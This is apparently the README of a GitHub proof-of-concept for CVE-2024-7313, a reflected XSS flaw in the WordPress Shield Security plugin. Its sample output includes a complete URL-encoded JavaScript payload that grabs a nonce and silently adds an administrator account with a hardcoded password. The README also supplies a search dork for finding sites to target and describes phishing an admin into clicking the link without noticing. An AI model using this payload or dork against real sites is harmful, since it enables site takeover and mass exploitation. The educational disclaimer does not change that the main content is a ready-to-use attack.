
# Shield Security Plugin Vulnerability Exploit (CVE-2024-7313)

![Kali Linux](https://img.shields.io/badge/Kali%20Linux-Yes-blue?style=flat&logo=kalilinux)
![Works on My Machine](https://img.shields.io/badge/works-on%20my%20machine-green.svg)
![Sleep Deprivation](https://img.shields.io/badge/sleep-deprived-yellow.svg)

## Overview

This repository contains a Python PoC script designed to exploit a reflected XSS vulnerability in the Shield Security Plugin for WordPress, affecting versions below 20.0.6. The vulnerability (CVE-2024-7313) allows an attacker to create malicious link custom to the target which when an admin clicks on it, the exploit will create an unauthorized admin account via XSS. The script automatically detects vulnerable installations and generates a payload to exploit the vulnerability.

## Vulnerability Information

- **CVE**: CVE-2024-7313
- **Plugin**: Shield Security < 20.0.6
- **Severity**: High
- **Affected Systems**: WordPress websites using Shield Security plugin versions < 20.0.6
- **Attack Type**: Reflected Cross-Site Scripting (XSS)
- **Published Date**: August 7, 2024
- **OWASP TOP-10**: A7: Cross-Site Scripting (XSS)

## Usage

### Prerequisites

- Python 3.x
- `requests` and `beautifulsoup4` libraries

Install the required libraries using:

```bash
pip install requests beautifulsoup4
```

### Running the Script

1. Clone the repository:

```bash
git clone https://github.com/Wayne-Ker/CVE-2024-7313.git
cd CVE-2024-7313
```

2. Run the script with the target URL:

```bash
python3 exploit.py <target_url>
```

Example:

```bash
python3 exploit.py http://127.0.0.1
```

After entering the necessary details for the new admin user (username, email, first name, last name), the script will generate a payload URL. You can paste this URL into your browser to execute the reflected XSS attack, which will create a new admin user in the WordPress site.

3. Example Output:

```
#############################################################################
#                                                                           #
#                                                                           #
#   ______     _______     ____   ___ ____  _  _       _____ _____ _ _____  #
#  / ___\ \   / | ____|   |___ \ / _ |___ \| || |     |___  |___ // |___ /  #
# | |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ / /  |_ \| | |_ \  #
# | |___  \ V / | |__|_____/ __/| |_| / __/|__   _|_____/ /  ___) | |___) | #
#  \____|  \_/  |_____|   |_____|\___|_____|  |_|      /_/  |____/|_|____/  #
#                                                                           #
#    Shield Security Plugin Vulnerability (CVE-2024-7313)                   #
#    Reflected XSS in WordPress Shield Security Plugin                      #
#    Versions Affected: < 20.0.6                                            #
#    Risk: High                                                             #
#    Developed by: Wayne-Kerr                                              #
#    Published: August 7, 2024                                              #
############################################################################# 
Shield Security version is vulnerable. Let's continue.
Enter username: fakename
Enter email: fake-email@test.com
Enter first name: Haxor
Enter last name: test

Using hardcoded password: HaxorStrongAFPassword123!!

Generated XSS Payload URL: http://127.0.0.1/wp-admin/admin.php?page=icwp-wpsf-plugin&nav=dashboard&nav_sub=%3Cscript%3Evar%20xhrNonce%20%3D%20new%20XMLHttpRequest%28%29%3B%20xhrNonce.open%28%27GET%27%2C%20%27/wp-admin/user-new.php%27%2C%20true%29%3B%20xhrNonce.onload%20%3D%20function%28%29%20%7B%20if%20%28xhrNonce.status%20%3D%3D%3D%20200%29%20%7B%20var%20nonce%20%3D%20xhrNonce.responseText.match%28/name%3D%22_wpnonce_create-user%22%20value%3D%22%28%5Ba-zA-Z0-9%5D%2B%29%22/%29%5B1%5D%3B%20var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%20xhr.open%28%27POST%27%2C%20%27/wp-admin/user-new.php%27%2C%20true%29%3B%20xhr.setRequestHeader%28%27Content-Type%27%2C%20%27application/x-www-form-urlencoded%27%29%3B%20xhr.setRequestHeader%28%27Referer%27%2C%20%27http%3A//127.0.0.1/wp-admin/user-new.php%27%29%3B%20xhr.setRequestHeader%28%27Origin%27%2C%20%27http%3A//127.0.0.1%27%29%3B%20var%20params%20%3D%20%27action%3Dcreateuser%26_wpnonce_create-user%3D%27%20%2B%20nonce%20%2B%20%27%26_wp_http_referer%3D%252Fwp-admin%252Fuser-new.php%26user_login%3Dnick%26email%3Dnick%2540test.com%26first_name%3Dnick%26last_name%3Dtest%26url%3Dtest%26pass1%3DHaxorStrongAFPassword123%2521%2521%26pass2%3DHaxorStrongAFPassword123%2521%2521%26role%3Dadministrator%26createuser%3DAdd%2BNew%2BUser%27%3B%20xhr.send%28params%29%3B%20xhr.onload%20%3D%20function%28%29%20%7B%20if%20%28xhr.status%20%3D%3D%20200%29%20%7B%20console.log%28%27Admin%20user%20created%20successfully%27%29%3B%20window.location.href%20%3D%20%27http%3A//127.0.0.1/wp-admin/admin.php%3Fpage%3Dicwp-wpsf-plugin%26nav%3Ddashboard%26nav_sub%3Doverview%27%3B%20%7D%20else%20%7B%20console.log%28%27Error%20occurred%3A%20%27%20%2B%20xhr.statusText%29%3B%20%7D%20%7D%3B%20%7D%20else%20%7B%20console.log%28%27Error%20fetching%20nonce%3A%20%27%20%2B%20xhrNonce.statusText%29%3B%20%7D%20%7D%3B%20xhrNonce.send%28%29%3B%3C/script%3E
```

Once you visit the generated XSS payload URL, the exploit will be executed, and a new admin user will be created on the target WordPress site.

### Help Menu

You can access the help menu by running:

```bash
python3 exploit.py -h
```

### Dork to Find Vulnerable Sites

To identify websites that are using the vulnerable plugin, you can use the following dork:

```
inurl:"/wp-content/plugins/wp-simple-firewall/"
```

This will help you find websites that have the Shield Security plugin installed. Please note that the version number is not publicly visible, so manual testing may be required.

## How It Works

- The script first checks if the target WordPress installation is using a vulnerable version of the Shield Security plugin by examining the response from the `wp-login.php` page.
- If the plugin version is vulnerable, it proceeds to generate a reflected XSS payload that, when executed, will create a new admin user with a hardcoded password.
- The payload is created to first use a GET request to dynamically find the WordPress nonce used for account creation, then use that nonce to submit a POST request to the user creation endpoint with the details of the new user given in the script. 
- The payload is then URL-encoded and displayed for use in the attack.
- Once sent to an administrator of the site and the link is clicked, a new Administrator user will be created on the site with the details parsed by the script. This is all done in the background, with the phished administrator being redirected to the Shield Security dashboard with no clue of the exploit in the background. 

## Disclaimer

This tool is intended for educational purposes only and should only be used in authorized penetration testing environments. Unauthorized access or use of systems you do not own is illegal. The author is not responsible for any misuse of this tool.

## License

This project is licensed under the MIT License.
.
